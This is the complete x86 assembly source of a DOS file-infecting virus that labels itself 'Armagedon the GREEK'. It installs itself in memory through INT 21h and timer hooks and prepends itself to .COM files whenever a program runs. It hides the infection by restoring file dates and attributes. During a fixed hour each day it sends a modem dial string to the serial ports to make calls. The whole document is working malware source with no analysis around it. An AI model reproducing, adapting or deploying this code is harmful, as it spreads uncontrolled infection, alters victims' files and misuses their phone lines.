dta						equ			offset last_byte+10
virlen				equ			(offset last_byte - offset start)
strlen				equ			(offset endstr - offset startstr)

code					segment
							assume 	cs:code,ds:code
							org			100h
start:				jmp 		main

newint21			proc 		far										; SETS THE 'INT 21h' VIRUSED
							pushf	  											; Save flags for compare     
				      cmp 		ah,0e0h               ; Is it exist-test?      
	    			  jnz 		notest1               ; if not go on   
					    mov 		ax,0dadah             ; else return signature,
	      			popf													; restore flag and
							iret	                        ; return to program
notest1:			cmp			ah,0e1h
							jnz			notest2
							mov			ax,cs
							popf
							iret
notest2:      cmp 		ax,4b00h              ; is 'EXEC' command?
							jz 			infector							; if yes go to 'infection'
do_oldint:    popf	                        ; restore flags        
	      			jmp 		dword ptr cs:oldint21a; jump to normal INT 21h
newint21			endp

oldint21a			dw 			?											; old INT 21h vector (low)
oldint21b			dw 			?											; old INT 21h vector (high)
oldint8a			dw 			?											; old INT 8 vector (low)
oldint8b			dw 			?											; old INT 8 vector (high)
status				db 			0											; flag for time (call in progress)
ticks					db 			0											; 18.2 tick counter
cur_h					db 			0											; Current time (HOURS)
cur_m					db 			0											; Current time (MINUTES)
cur_s					db 			0											; Current time (SECONDS)
count					dw 			0											; dial counter (30 sec, 540 ticks)
garbidge			db			0
stringpos			db			0
call_made			db			0
init_done			db			0
comext				db 			'COM'									; Valid inf. extension
handle				dw 			?											; inf. handle number
filesize			dw			20
prseg					dw			?
seg_buffer		dw			?
ss_reg				dw			?
sp_reg				dw			?
fileds				dw			?
filedx				dw			?
attr					dw			?
filedate			dw			?
filetime			dw			?

env_seg				dw			00h
cdline_offs		dw			81h
cdline_seg		dw			?
fcb1_offs			dw			5ch
fcb1_seg			dw			?
fcb2_offs			dw			6ch
fcb2_seg			dw			?

infector			proc 		near									; PROGRAM INFECTOR
							assume 	cs:code								;
							push 		ds										; save registers to
							push 		bx										; insure normal operation
							push 		si										; by the INT 21h (ah=4b00h)
						  push 		cx										; 
							push 		ax										;
						  push 		dx										;
							push 		bp										;
							push 		es										;
							push		di										;

							cld														; Reset direction to increament
							push 		dx										; Store the address of the
							push 		ds										; filespec (DS:DX)
							xor			cx,cx									; reset counter
							mov			si,dx									; set ptr to filespec
nxtchr:				mov 		al,ds:[si]						; take a char
							cmp 		al,0									; is it zero?
							jz			okay									; if yes goto okay
							inc 		cx										; else increase counter
							inc 		si										; and pointer
							jmp			nxtchr								; take the next chr if CX>0
okay:
							add			dx,cx									; Point to end of filespec
							sub			dx,3									; point to .EXT
							mov 		si,offset comext			; Check if it is a
							mov 		di,dx									; .COM file
							cmp			byte ptr ds:[di-3],'N'; 
							jnz			ok_1									; Is it a ND. ?
							cmp			byte ptr ds:[di-2],'D'; if yes exit!
							jz			nmatch								;
ok_1:					mov 		cx,3									; checking counter in 3
cmp_loop:			mov 		al,cs:[si]						;	take 1st ptr's chr
							cmp 		al,ds:[di]						;	and compare it with filespec
							jnz 		nmatch								; If no matching, exit
							inc 		si										; else increase 1st ptr
							inc 		di										; and second ptr
							loop 		cmp_loop							; take next compare if CX>0

							pop 		ds										;	restore ds and dx to point
							pop 		dx										; 
							
							push	 	dx										; Store pointer
							push 		ds										;					
							mov 		si,dx									; Check if filespec	
							mov 		dl,0									; contains a drive
							cmp 		byte ptr ds:[si+1],':'; letter
							jnz 		nodrive								; If no jump to nodrive spec.
							mov 		dl,ds:[si]						; else take the drive in DL
							and 		dl,0fh								; and modify for int 21h (ah=36h)
nodrive:			mov 		ah,36h								; Take free disk space of DL disk 
							int 		21h										; Do the call
							cmp 		ax,0ffffh							; Was an invalid drive specified?
							jz 			nmatch								; if yes, exit
							jmp			bypass								; Correct jx 127 limit

nmatch:				jmp			nomatch
invd:					jmp			invdrive
closeit1:			jmp			closeit
resdta1:			jmp			resdta

bypass:				cmp 		bx,3									; Are there at least 3 clust. free?
							jb 			nmatch								; If no, exit
							pop 		ds										; restore pointers
							pop 		dx										;

							push		ds										; and allocate memory
							push		dx										; for the infection
							mov  		cs:fileds,ds
							mov			cs:filedx,dx
							mov			ax,4300h							; code for Get Attr
							int			21h
							mov			cs:attr,cx
							mov			ax,4301h
							xor			cx,cx
							int			21h

							mov			bx,0ffffh
							mov			ah,48h
							int			21h
							mov			ah,48h
							int			21h
							mov			cs:seg_buffer,ax

							mov			ax,cs
							mov			ds,ax
							mov			dx,dta
							mov			ah,1ah
							int			21h
	
							pop			dx
							pop			ds
							mov 		ax,3d02h							; DosFn OPEN FILE (R/W)
							clc														; Clear carry flag
							int 		21h										; Do open
							jc			closeit1							; If Error exit
							mov  		bx,ax									; Handle to BX
							mov			cs:handle,ax					; save handle
							mov 		cx,0ffffh							; Bytes to read
							mov			ax,cs:seg_buffer			;
							mov			ds,ax									;
							mov			dx,virlen							; DS:DX points to buffer
							mov			ah,3fh								; DosFn READ FROM FILE
							clc														; clear carry flag
							int			21h										; Do the call
							jc			closeit1							; if error exit
							mov			cs:filesize,ax				; Num of bytes actually read
								;cmp			ax,0e000h							; max com size to infect
								;ja			closeit1							; if size>max exit 
							cmp			ax,virlen							; if filesize is less than the
							jb			virit									; virus size then it is clean
							mov			si,virlen+1						; Set 1st ptr to START of file
							add 		si,si									; add 1st ptr the length of file
							sub			si,21									; and subtract 12 to point to sig.
							mov			cx,19									; set the test loop to 10 bytes	
							mov			di,offset signature		; Set 2nd ptr to constant signature
test_sig:			mov			al,ds:[si]						; take the byte pointed to by SI
							mov			ah,cs:[di]						; and compare it with the byte
							cmp			ah,al									; pointed to by DI
							jne			virit									; if not equal then it is clean!
							inc			si										; else increase 1st pointer
							inc 		di										; increase 2nd pointer
							loop		test_sig							; continue with next if CX>0
							jmp			closeit

virit:				mov			ax,4200h							; Code for LSEEK (Start)
							mov			bx,cs:handle					; Handle num in BX
							xor			cx,cx									; Reset CX
							mov			dx,cx									; and DX
							int			21h										; Do the call
							jc			closeit

							mov			si,offset start				
							mov			cx,virlen
							xor			di,di
							mov			ax,cs:seg_buffer
							mov			ds,ax
virusin:			mov			al,cs:[si]
							mov			ds:[di],al
							inc			si
							inc			di
							loop		virusin

							mov			ax,5700h
							mov			bx,cs:handle
							int			21h
							mov			cs:filetime,cx
							mov			cs:filedate,dx							

							mov			ax,cs:seg_buffer
							mov			ds,ax

							mov			si,virlen
							mov			al,ds:[si]
							add			al,11
							mov			ds:[si],al

							xor			dx,dx									; DX points to Buffer (file)
							mov			cx,cs:filesize				; Size of file in CX
							add 		cx,virlen							; But added by Virlen
							mov			bx,cs:handle					; File handle num in BX
							mov			ah,40h								; Code for WRITE FILE
							int 		21h										; Do the call

							mov			cx,cs:filetime
							mov			dx,cs:filedate
							mov			bx,cs:handle
							mov			ax,5701h
							int			21h

closeit:			mov			bx,cs:handle					; Handle in BX
							mov			ah,3eh								; Code for CLOSE FILE
							int			21h										; Do close it
							push		cs	
							pop			ds
resdta:				mov			dx,80h								; Reset the DTA
							mov			ah,1ah								; in Address 80H
							int 		21h										; Do call
							mov			ax,cs:seg_buffer
							mov			es,ax
							mov			ah,49h
							int			21h

							mov			ax,cs:fileds					;
							mov			ds,ax									;
							mov			dx,cs:filedx					;
							mov			ax,4301h							;
							mov			cx,cs:attr						;
							int 		21h										;
							jmp 		invdrive							; and exit
nomatch:			
							pop 		ds										
							pop			dx
							jmp     notinfect

invdrive:
notinfect:
							pop			di										; restore registers
							pop 		es										; to their initial 
							pop 		bp										; values
							pop 		dx										;
							pop 		ax										;
							pop 		cx										;
							pop 		si										;
							pop 		bx										;
							pop 		ds										;
							jmp 		do_oldint							; return from call 
infector 			endp

newint8				proc 		far										; VIRUS' TIMER ISR
							push		bp										; 
							push		ds										; store all registers
							push 		es										; and flags before
							push		ax										; the new timer 
							push		bx										; operations.
							push 		cx										; Otherwize a 'crush'
							push 		dx										; is unavoidable
							push		si										;	
							push		di										;		
							pushf													; Simulate an INT
							call 		dword ptr cs:oldint8a	; Do old timer stuff
							call 		tick									; update virus clock routine
							push		cs
							pop			ds
							mov 		ah,5									; Check if time
							mov			ch,cur_h							; is now above the
							cmp 		ah,ch									; lower limit (5 o'clock)
							ja 			exitpoint							; if not, exit
							mov 		ah,6									; Check if time
							cmp 		ah,ch									; is now below the higher limit
							jb 			exitpoint							; if not, exit
							mov 		ah,status							; get the virus status
							cmp			ah,1									; test if call in progress
							jz			in_progress						; if yes goto countdown routine
							mov 		ah,1									; if not, set the status to 
							mov			status,ah							; indicate 'In progress'
							jmp 		exitpoint							; and exit
in_progress:																; CALL IS IN PROGRESS!
							call 		dial									; else call dial routine
							inc 		count 	  						; CALL_TIMER
							mov			ax,count
							cmp			ax,540								; check for time-out
							jne			exitpoint							; if not, exit else 
							xor 		ax,ax									; set status to indicate
							mov     status,ah							; 'ready to call'!
							mov			count,ax							; reset call_timer 
							mov			call_made,ah
exitpoint:	
							pop 		di										; restore registers to 
							pop			si										; their values and
							pop			dx										; 
							pop			cx										;
							pop			bx										;
							pop			ax										;
							pop			es										;
							pop 		ds										;
							pop 		bp										;	
							iret													; return to program
newint8				endp

tick					proc 		near									; VIRUS' CLOCK ROUTINE
							assume  cs:code,ds:code
							push		cs
							pop			ds
							xor			al,al
							mov 		ah,ticks							; test if ticks have
							cmp			ah,17									; reached limit (17)
							jnz			incticks							; if no, incerase ticks
							mov			ah,cur_s							; test if seconds have
							cmp			ah,59									; reached limit (59)
							jnz			incsec								; if no, increase seconds
							mov 		ah,cur_m							; test if minutes have
							cmp 		ah,59									; reached limit (59)
							jnz			incmin								; if no, increase minutes
							mov 		ah,cur_h							; test if hours have
							cmp			ah,23									; reached limit (23)
							jnz			inchour								; if no, increase hours
							mov			cur_h,al							; else reset hours
exitp3:				mov			cur_m,al							; reset minutes
exitp2:				mov			cur_s,al							; reset seconds
exitp1:				mov			ticks,al							; reset ticks
							ret														; end exit
incticks:			inc 		ticks									; increase ticks
							ret														; and exit
incsec:				inc			cur_s									; increase seconds
							jmp			exitp1								; and exit
incmin:				inc 		cur_m									; increase minutes
							jmp			exitp2								; and exit
inchour:			inc			cur_h									; increase hours 
							jmp 		exitp3								; end exit
tick					endp

startstr:
string				db 			'+++aTh0m0s7=35dp081,,,,141'
endstr:

dial					proc 		near
							assume 	cs:code,ds:code
							
							mov			al,call_made
							cmp			al,1
							jz			exit_dial
							mov			al,init_done
							cmp			al,1
							jz			send_one
							
							mov			cx,3
next_init:		mov 		dx,cx
							xor			ah,ah
							mov 		al,131
							int 		14h
							loop 		next_init
							mov			al,1
							mov			init_done,al
							jmp			exit_dial

send_one:			push		cs
							pop			ds
							mov 		si,offset string
							mov			al,stringpos
							cmp			al,strlen
							jnz			do_send
							jmp			sendret

do_send:			xor			ah,ah
							add			si,ax
next_char:		mov 		al,[si]
							mov 		dx,3f8h
							out 		dx,al
							mov 		dx,2f8h
							out 		dx,al
							mov 		dx,2e8h
							out 		dx,al
							mov 		dx,3e8h
							out 		dx,al
							inc			stringpos
							jmp			exit_dial

sendret:			mov			cx,3
retloop:			mov			dx,cx
							mov			al,13
							mov			ah,1
							int			14h
							loop		retloop

reset:				mov			ax,0001h
							mov			call_made,al
							mov			stringpos,ah
							mov			init_done,ah
exit_dial:		ret
dial					endp

main:																				; VIRUS' MEMORY INSTALLER 
							assume  cs:code,ds:code		  	; 
							mov 		ah,0e0h								; is VIRUS already 
							int 		21h										; in memory?
							cmp 		ax,0dadah							; if yes then
							jnz  		cont									; terminate, else
							jmp			already_in
cont:					push		cs
							pop			ds
							mov 		ax,3521h							; capture the old 			
							int 		21h										; INT 21h vector and
							mov 		oldint21a,bx					; store the absolute address
							mov 		oldint21b,es					; in 'oldint21x' variables
							mov 		dx,offset newint21		; point to new INT 21h ISR
							mov 		ax,2521h							; replace it to vector
							int 		21h										; 
							mov 		ax,3508h							; capture the old
							int 		21h										; timer vector and
							mov 		oldint8a,bx						; store the address
							mov 		oldint8b,es						; in 'oldint8x' var
							mov 		dx,offset newint8			; point to new timer ISR
							mov 		ax,2508h							; replace it to vector
							int 		21h										;  
							mov 		ah,2ch								; get the current
							int 		21h										; time from DOS
							mov 		cur_h,ch							; and store it
							mov 		cur_m,cl							; for the 
							mov 		cur_s,dh							; virus' timer
							; RUN PROGRAM!
							mov 		ax,cs:[2ch]
							mov			ds,ax
							xor			si,si
loop1:				mov			al,ds:[si]
							cmp 		al,1
							jz			exitl1
							inc			si
							jmp			loop1
exitl1:				inc			si
							inc			si
							mov 		dx,si

							mov			ax,cs
							mov			es,ax							; SHRINK  BLOCK
							mov			bx,90
							mov			ah,4ah
							int			21h

							mov			bx,cs:[81h]
							mov			ax,cs
							mov			es,ax
							mov			cs:fcb1_seg,ax
							mov			cs:fcb2_seg,ax
							mov			cs:cdline_seg,ax
							mov			ax,4b00h
							;					
							;
							;
							mov			cs:ss_reg,ss
							mov			cs:sp_reg,sp
							pushf
							call 		dword ptr cs:oldint21a
							mov			ax,cs:ss_reg
							mov			ss,ax
							mov			ax,cs:sp_reg
							mov			sp,ax
							mov			ax,cs
							mov			ds,ax
							mov 		dx,offset last_byte
							int 		27h
							
already_in:		mov			ah,0e1h
							int			21h
							mov			si,offset pokelabl
							mov			cs:[si+3],ax
							mov			ax,offset fix_com
							mov			cs:[si+1],ax
							mov			ax,cs:filesize
							mov			bx,cs
pokelabl:			db			0eah,00h,00h,00h,00h

fix_com:			mov			cx,ax
							mov			ds,bx
							mov			si,100h
							mov			di,100h+virlen
dofix:				mov			al,ds:[di]
							mov			ds:[si],al
							inc			si
							inc			di
							loop		dofix
							mov			si,offset poklb
							mov			cs:[si+3],ds
							mov			al,ds:[100h]
							sub			al,11
							mov			ds:[100h],al
							mov			ax,ds
							mov			es,ax
							mov			ss,ax
poklb:				db			0eah,00h,01h,00h,00h

signature:		db 			'Armagedon the GREEK'
last_byte:		db			90h+11
							nop
							nop
							nop
							mov			ah,4ch
							int 		21h
code					ends
							end 		start
